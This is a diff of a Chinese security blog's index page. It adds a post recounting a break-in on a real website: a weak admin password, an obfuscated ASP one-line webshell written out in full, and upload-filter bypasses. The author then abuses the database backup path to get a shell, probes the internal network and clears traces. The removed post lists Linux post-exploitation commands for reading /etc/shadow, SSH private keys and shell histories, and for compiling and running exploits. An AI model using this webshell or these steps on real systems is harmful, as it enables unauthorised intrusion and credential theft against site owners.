@@ -1574,6 +1574,203 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/19/数据库备份getshell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/05/19/数据库备份getshell/" itemprop="url">
+                  数据库备份getshell
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-19T11:16:25+08:00">
+                2018-05-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/05/19/数据库备份getshell/" class="leancloud_visitors" data-flag-title="数据库备份getshell">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>很久之前通过数据库备份拿到的一个webshell，本来准备等他们修复了之后再写的，但是提交了漏洞和修复方案他们接收之后很长时间没有修复，忽视了漏洞。所以今天写出来了。</p>
+<h2 id="0x01-多次尝试"><a href="#0x01-多次尝试" class="headerlink" title="0x01 多次尝试"></a>0x01 多次尝试</h2><p>首先这个站是偶然google hacking时找到的后台弱密码，进入后台之后发现是IIS6.0的服务器：</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback01.png" alt=""></p>
+<p>这个后台可以对前端的文章、新闻等进行修改，发现可以上传图片到文章中，是一个上传点。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback02.png" alt=""></p>
+<p>先编辑一个一句话木马,存为asp格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%eval&quot;&quot;&amp;(&quot;e&quot;&amp;&quot;v&quot;&amp;&quot;a&quot;&amp;&quot;l&quot;&amp;&quot;(&quot;&amp;&quot;r&quot;&amp;&quot;e&quot;&amp;&quot;q&quot;&amp;&quot;u&quot;&amp;&quot;e&quot;&amp;&quot;s&quot;&amp;&quot;t&quot;&amp;&quot;(&quot;&amp;&quot;0&quot;&amp;&quot;-&quot;&amp;&quot;2&quot;&amp;&quot;-&quot;&amp;&quot;4&quot;&amp;&quot;)&quot;&amp;&quot;)&quot;)%&gt;</span><br></pre></td></tr></table></figure></p>
+<p>直接上传.asp文件，被防火墙阻止。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback03.png" alt=""></p>
+<p>先上传.jpg文件，然后通过burpsuite更改后缀为.asp，然后上传，发现仍然被拦截，看来是后端拦截。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback04.png" alt=""></p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback05.png" alt=""></p>
+<p>尝试使用IIS6.0的解析漏洞，将.asp;.jpg文件解析成.asp文件，但是更改了一个1.asp;.jpg后缀的文件上传之后，文件名整体被改成一个日期的+随机数+.jpg的文件名。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback06.png" alt=""></p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback07.png" alt=""></p>
+<p>尝试用burpsuite改数据，0x00截断方式、超长文件名仍然不可行。</p>
+<h2 id="0x02-改变思路"><a href="#0x02-改变思路" class="headerlink" title="0x02 改变思路"></a>0x02 改变思路</h2><p>本来测试到这里我已经放弃通过上传点来getshell，但是不甘心就去问了下朋友，朋友说他正好在复现这个kindeditor编辑器的漏洞，为我提供了其他思路，我去网上找了一会kindeditor编辑器漏洞版本，尝试了一会，发现目前这个版本是4.1.10不存在之前那些典型的漏洞。</p>
+<p>然后这个时候朋友告诉我有数据库备份，可以通过数据库备份功能来利用解析漏洞。</p>
+<h2 id="0x03-开始尝试"><a href="#0x03-开始尝试" class="headerlink" title="0x03 开始尝试"></a>0x03 开始尝试</h2><p>先编辑一个过狗asp马，更改为jpg格式上传。</p>
+<p>然后在数据库备份界面，发现直接无法更改备份的源路径和目的路径</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback08.png" alt=""></p>
+<p>但是这两个路径是前端可控的，那就很容易了，直接f12更改页面中对应的原路径为自己上传的图片马，目的路径为123.asp即可。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback09.png" alt=""></p>
+<p>然后备份数据库，在upload路径找到自己的马，直接用菜刀连接，成功getshell。</p>
+<p><img src="http://oo3iot5oz.bkt.clouddn.com/databaseback/dbback10.png" alt=""></p>
+<p>后来传大马稍微对内网测试了一下，然后完成之后清理痕迹。</p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>虽然是很老的一个漏洞了，没有太多亮点，但是体现了渗透测试过程中要力求多样性，了解的方式和技巧越多，就距离成功越接近。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/17/渗透测试框架metasploit/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2427,214 +2624,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/08/内网渗透常用命令总结（linux）/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/05/08/内网渗透常用命令总结（linux）/" itemprop="url">
-                  内网渗透常用命令总结（linux）
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-08T21:34:32+08:00">
-                2018-05-08
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/笔记/" itemprop="url" rel="index">
-                    <span itemprop="name">笔记</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/05/08/内网渗透常用命令总结（linux）/" class="leancloud_visitors" data-flag-title="内网渗透常用命令总结（linux）">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>上次总结了windows系统在内网渗透和提权中的常用命令，这篇总结下linux在内网渗透中常用的命令。</p>
-<h2 id="0x01-查看操作系统信息"><a href="#0x01-查看操作系统信息" class="headerlink" title="0x01 查看操作系统信息"></a>0x01 查看操作系统信息</h2><h4 id="操作系统版本"><a href="#操作系统版本" class="headerlink" title="操作系统版本"></a>操作系统版本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">cat /etc/lsb-release      # Debian </span><br><span class="line">cat /etc/redhat-release   # Redhat</span><br></pre></td></tr></table></figure>
-<h4 id="内核版本"><a href="#内核版本" class="headerlink" title="内核版本"></a>内核版本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/version</span><br><span class="line">uname -a</span><br><span class="line">uname -mrs</span><br><span class="line">rpm -q kernel</span><br><span class="line">dmesg | grep Linux</span><br><span class="line">ls /boot | grep vmlinuz-</span><br></pre></td></tr></table></figure>
-<h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/profile</span><br><span class="line">cat /etc/bashrc</span><br><span class="line">cat ~/.bash_profile</span><br><span class="line">cat ~/.bashrc</span><br><span class="line">cat ~/.bash_logout</span><br><span class="line">env</span><br><span class="line">set</span><br></pre></td></tr></table></figure>
-<h2 id="0x02-应用和服务"><a href="#0x02-应用和服务" class="headerlink" title="0x02 应用和服务"></a>0x02 应用和服务</h2><h4 id="正在运行的程序和权限"><a href="#正在运行的程序和权限" class="headerlink" title="正在运行的程序和权限"></a>正在运行的程序和权限</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ps aux</span><br><span class="line">ps -ef</span><br><span class="line">top</span><br><span class="line">cat /etc/services</span><br></pre></td></tr></table></figure>
-<p>如果要查询root权限运行的进程，可以补充为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep root</span><br><span class="line">ps -ef | grep root</span><br></pre></td></tr></table></figure></p>
-<h4 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /usr/bin/</span><br><span class="line">ls -alh /sbin/</span><br><span class="line">dpkg -l</span><br><span class="line">rpm -qa</span><br><span class="line">ls -alh /var/cache/apt/archives</span><br><span class="line">ls -alh /var/cache/yum/</span><br></pre></td></tr></table></figure>
-<h4 id="服务的配置文件"><a href="#服务的配置文件" class="headerlink" title="服务的配置文件"></a>服务的配置文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/syslog.conf</span><br><span class="line">cat /etc/chttp.conf</span><br><span class="line">cat /etc/lighttpd.conf</span><br><span class="line">cat /etc/cups/cupsd.conf</span><br><span class="line">cat /etc/inetd.conf</span><br><span class="line">cat /etc/apache2/apache2.conf</span><br><span class="line">cat /etc/my.conf</span><br><span class="line">cat /etc/httpd/conf/httpd.conf</span><br><span class="line">cat /opt/lampp/etc/httpd.conf</span><br><span class="line">ls -aRl /etc/ | awk &apos;$1 ~ /^.*r.*/&apos;</span><br></pre></td></tr></table></figure>
-<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh /var/spool/cron</span><br><span class="line">ls -al /etc/ | grep cron</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron*</span><br><span class="line">cat /etc/at.allow</span><br><span class="line">cat /etc/at.deny</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/anacrontab</span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>
-<h4 id="存储的明文用户名，密码"><a href="#存储的明文用户名，密码" class="headerlink" title="存储的明文用户名，密码"></a>存储的明文用户名，密码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep -i user [filename]</span><br><span class="line">grep -i pass [filename]</span><br><span class="line">grep -C 5 &quot;password&quot; [filename]</span><br><span class="line">find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot;   # Joomla</span><br></pre></td></tr></table></figure>
-<h2 id="0x03-网络相关"><a href="#0x03-网络相关" class="headerlink" title="0x03 网络相关"></a>0x03 网络相关</h2><h4 id="网络地址"><a href="#网络地址" class="headerlink" title="网络地址"></a>网络地址</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ifconfig -a</span><br><span class="line">cat /etc/network/interfaces</span><br><span class="line">cat /etc/sysconfig/network</span><br></pre></td></tr></table></figure>
-<h4 id="网络配置-DNS-DHCP-网关"><a href="#网络配置-DNS-DHCP-网关" class="headerlink" title="网络配置,DNS,DHCP,网关"></a>网络配置,DNS,DHCP,网关</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/resolv.conf</span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line">cat /etc/networks</span><br><span class="line">iptables -L</span><br><span class="line">hostname</span><br><span class="line">dnsdomainname</span><br></pre></td></tr></table></figure>
-<h4 id="网络通信"><a href="#网络通信" class="headerlink" title="网络通信"></a>网络通信</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">lsof -i</span><br><span class="line">lsof -i :80</span><br><span class="line">grep 80 /etc/services</span><br><span class="line">netstat -antup</span><br><span class="line">netstat -antpx</span><br><span class="line">netstat -tulpn</span><br><span class="line">chkconfig --list</span><br><span class="line">chkconfig --list | grep 3:on</span><br><span class="line">last</span><br><span class="line">w</span><br></pre></td></tr></table></figure>
-<h4 id="路由缓存"><a href="#路由缓存" class="headerlink" title="路由缓存"></a>路由缓存</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">arp -e</span><br><span class="line">route</span><br><span class="line">route -nee</span><br></pre></td></tr></table></figure>
-<h2 id="0x04-用户相关"><a href="#0x04-用户相关" class="headerlink" title="0x04 用户相关"></a>0x04 用户相关</h2><h4 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">who</span><br><span class="line">w</span><br><span class="line">last</span><br><span class="line">cat /etc/passwd</span><br><span class="line">cat /etc/group</span><br><span class="line">cat /etc/shadow</span><br><span class="line">ls -alh /var/mail/</span><br><span class="line">grep -v -E &quot;^#&quot; /etc/passwd | awk -F: &apos;$3 == 0 &#123; print $1&#125;&apos;   # 列出超级用户</span><br><span class="line">awk -F: &apos;($3 == &quot;0&quot;) &#123;print&#125;&apos; /etc/passwd   #列出超级用户</span><br><span class="line">cat /etc/sudoers</span><br><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<h4 id="列主目录"><a href="#列主目录" class="headerlink" title="列主目录"></a>列主目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -ahlR /root/</span><br><span class="line">ls -ahlR /home/</span><br></pre></td></tr></table></figure>
-<h4 id="其他用户的操作记录"><a href="#其他用户的操作记录" class="headerlink" title="其他用户的操作记录"></a>其他用户的操作记录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.bash_history</span><br><span class="line">cat ~/.nano_history</span><br><span class="line">cat ~/.atftp_history</span><br><span class="line">cat ~/.mysql_history</span><br><span class="line">cat ~/.php_history</span><br></pre></td></tr></table></figure>
-<h4 id="ssh私钥"><a href="#ssh私钥" class="headerlink" title="ssh私钥"></a>ssh私钥</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">cat ~/.ssh/authorized_keys</span><br><span class="line">cat ~/.ssh/identity.pub</span><br><span class="line">cat ~/.ssh/identity</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line">cat ~/.ssh/id_rsa</span><br><span class="line">cat ~/.ssh/id_dsa.pub</span><br><span class="line">cat ~/.ssh/id_dsa</span><br><span class="line">cat /etc/ssh/ssh_config</span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_key</span><br></pre></td></tr></table></figure>
-<h2 id="0x05-文件系统相关"><a href="#0x05-文件系统相关" class="headerlink" title="0x05 文件系统相关"></a>0x05 文件系统相关</h2><h4 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /var/log</span><br><span class="line">ls -alh /var/mail</span><br><span class="line">ls -alh /var/spool</span><br><span class="line">ls -alh /var/spool/lpd</span><br><span class="line">ls -alh /var/lib/pgsql</span><br><span class="line">ls -alh /var/lib/mysql</span><br><span class="line">cat /var/lib/dhcp3/dhclient.lea</span><br><span class="line">cat /etc/httpd/logs/access_log</span><br><span class="line">cat /etc/httpd/logs/access.log</span><br><span class="line">cat /etc/httpd/logs/error_log</span><br><span class="line">cat /etc/httpd/logs/error.log</span><br><span class="line">cat /var/log/apache2/access_log</span><br><span class="line">cat /var/log/apache2/access.log</span><br><span class="line">cat /var/log/apache2/error_log</span><br><span class="line">cat /var/log/apache2/error.log</span><br><span class="line">cat /var/log/apache/access_log</span><br><span class="line">cat /var/log/apache/access.log</span><br><span class="line">cat /var/log/auth.log</span><br><span class="line">cat /var/log/chttp.log</span><br><span class="line">cat /var/log/cups/error_log</span><br><span class="line">cat /var/log/dpkg.log</span><br><span class="line">cat /var/log/faillog</span><br><span class="line">cat /var/log/httpd/access_log</span><br><span class="line">cat /var/log/httpd/access.log</span><br><span class="line">cat /var/log/httpd/error_log</span><br><span class="line">cat /var/log/httpd/error.log</span><br><span class="line">cat /var/log/lastlog</span><br><span class="line">cat /var/log/lighttpd/access.log</span><br><span class="line">cat /var/log/lighttpd/error.log</span><br><span class="line">cat /var/log/lighttpd/lighttpd.access.log</span><br><span class="line">cat /var/log/lighttpd/lighttpd.error.log</span><br><span class="line">cat /var/log/messages</span><br><span class="line">cat /var/log/secure</span><br><span class="line">cat /var/log/syslog</span><br><span class="line">cat /var/log/wtmp</span><br><span class="line">cat /var/log/xferlog</span><br><span class="line">cat /var/log/yum.log</span><br><span class="line">cat /var/run/utmp</span><br><span class="line">cat /var/webmin/miniserv.log</span><br><span class="line">cat /var/www/logs/access_log</span><br><span class="line">cat /var/www/logs/access.log</span><br><span class="line">ls -alh /var/lib/dhcp3/</span><br><span class="line">ls -alh /var/log/postgresql/</span><br><span class="line">ls -alh /var/log/proftpd/</span><br><span class="line">ls -alh /var/log/samba/</span><br></pre></td></tr></table></figure>
-<h4 id="网站文件"><a href="#网站文件" class="headerlink" title="网站文件"></a>网站文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls -alhR /var/www/</span><br><span class="line">ls -alhR /srv/www/htdocs/</span><br><span class="line">ls -alhR /usr/local/www/apache22/data/</span><br><span class="line">ls -alhR /opt/lampp/htdocs/</span><br><span class="line">ls -alhR /var/www/html/</span><br></pre></td></tr></table></figure>
-<h4 id="文件挂载"><a href="#文件挂载" class="headerlink" title="文件挂载"></a>文件挂载</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mount</span><br><span class="line">df -h</span><br><span class="line">cat /etc/fstab</span><br></pre></td></tr></table></figure>
-<h4 id="可写目录"><a href="#可写目录" class="headerlink" title="可写目录"></a>可写目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -writable -type d 2&gt;/dev/null      # 可写目录</span><br><span class="line">find / -perm -222 -type d 2&gt;/dev/null     # 可写目录 </span><br><span class="line">find / -perm -o w -type d 2&gt;/dev/null     # 可写目录</span><br><span class="line">find / -perm -o x -type d 2&gt;/dev/null     # 可执行目录</span><br><span class="line">find / \( -perm -o w -perm -o x \) -type d 2&gt;/dev/null   # 可写可执行目录</span><br></pre></td></tr></table></figure>
-<h2 id="0x06-准备与攻击"><a href="#0x06-准备与攻击" class="headerlink" title="0x06 准备与攻击"></a>0x06 准备与攻击</h2><h4 id="语言支持"><a href="#语言支持" class="headerlink" title="语言支持"></a>语言支持</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">find / -name perl*</span><br><span class="line">find / -name python*</span><br><span class="line">find / -name gcc*</span><br><span class="line">find / -name cc</span><br></pre></td></tr></table></figure>
-<h4 id="上传方式"><a href="#上传方式" class="headerlink" title="上传方式"></a>上传方式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">find / -name wget</span><br><span class="line">find / -name nc*</span><br><span class="line">find / -name netcat*</span><br><span class="line">find / -name tftp*</span><br><span class="line">find / -name ftp</span><br></pre></td></tr></table></figure>
-<h4 id="寻找exp"><a href="#寻找exp" class="headerlink" title="寻找exp"></a>寻找exp</h4><ul>
-<li><a href="http://www.exploit-db.com" target="_blank" rel="noopener">http://www.exploit-db.com</a></li>
-<li><a href="http://1337day.com" target="_blank" rel="noopener">http://1337day.com</a></li>
-<li><a href="http://www.securiteam.com" target="_blank" rel="noopener">http://www.securiteam.com</a></li>
-<li><a href="http://www.securityfocus.com" target="_blank" rel="noopener">http://www.securityfocus.com</a></li>
-<li><a href="http://www.exploitsearch.net" target="_blank" rel="noopener">http://www.exploitsearch.net</a></li>
-<li><a href="http://metasploit.com/modules/" target="_blank" rel="noopener">http://metasploit.com/modules/</a></li>
-<li><a href="http://securityreason.com" target="_blank" rel="noopener">http://securityreason.com</a></li>
-<li><a href="http://seclists.org/fulldisclosure/" target="_blank" rel="noopener">http://seclists.org/fulldisclosure/</a></li>
-<li><a href="http://www.google.com" target="_blank" rel="noopener">http://www.google.com</a></li>
-</ul>
-<h4 id="编译exp"><a href="#编译exp" class="headerlink" title="编译exp"></a>编译exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">which gcc</span><br><span class="line">gcc exp.c -o exp</span><br></pre></td></tr></table></figure>
-<h4 id="运行exp"><a href="#运行exp" class="headerlink" title="运行exp"></a>运行exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2684,7 +2673,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">57</span>
+                <span class="site-state-item-count">58</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
